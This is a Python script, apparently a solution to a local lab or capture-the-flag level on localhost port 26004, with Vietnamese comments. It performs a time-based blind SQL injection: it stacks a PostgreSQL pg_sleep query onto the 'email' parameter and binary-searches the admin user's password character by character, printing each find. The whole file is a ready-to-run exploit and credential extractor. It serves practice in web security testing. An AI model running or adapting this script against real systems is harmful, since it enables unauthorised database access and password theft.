import requests
import time
from urllib.parse import quote

#dung 3s, sai 0s

# Khoi tao
URL_TARGET = 'http://localhost:26004/level4.php'
PASSWORD = []
THRESHOLD = 4.0

# checklist cac ki tu ascii can kiem tra
charset = list(range(48, 58)) + list(range(97, 123))

# ham check bang
def checked_equal(start, char_mid):
    #PAYLOADS = f"' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{start},1)) = {char_mid}-- -"
    PAYLOADS = f"SELECT CASE WHEN (username='admin' AND ASCII(SUBSTRING(password,{start},1)) = {char_mid}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
    ENCODED_PAYLOADS = quote(PAYLOADS)

    FINAL_URL_TARGET = f"{URL_TARGET}?email=hehe'%3b{ENCODED_PAYLOADS}"
    #tg gui 
    start_time = time.perf_counter()
    r = requests.get(FINAL_URL_TARGET)
    end_time = time.perf_counter()

    return end_time - start_time

# Tao vong lap
for start in range(1, 30):
    #khoi tao low, high o day de no reset sau moi vong lap
    low = 0
    high = len(charset) - 1
    found = False 

    while low <= high:
        mid = (low + high) // 2
        char_mid = charset[mid]

        # so sanh lon hon
        #PAYLOADS = f"' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{start},1)) > {char_mid}-- -"
        PAYLOADS = f"SELECT CASE WHEN (username='admin' AND ASCII(SUBSTRING(password,{start},1)) > {char_mid}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
        ENCODED_PAYLOADS = quote(PAYLOADS)

        FINAL_URL_TARGET = f"{URL_TARGET}?email=hehe'%3b{ENCODED_PAYLOADS}"
        start_time = time.perf_counter()
        r = requests.get(FINAL_URL_TARGET)
        end_time = time.perf_counter()

        response_time = end_time - start_time


        if response_time >= THRESHOLD:
            low = mid + 1 #canh tren
        else: 
            if checked_equal(start, char_mid) >= THRESHOLD:
                ascii_char = chr(char_mid)
                PASSWORD.append(ascii_char)
                print()
                print("[FOUND] Tim thay pass roi ne ba: ", "".join(PASSWORD))
                found = True
                break
            else:
                high = mid - 1 #canh duoi

    if not found:
        break #het chuoi

print("[FINAL PASSWORD]:", "".join(PASSWORD))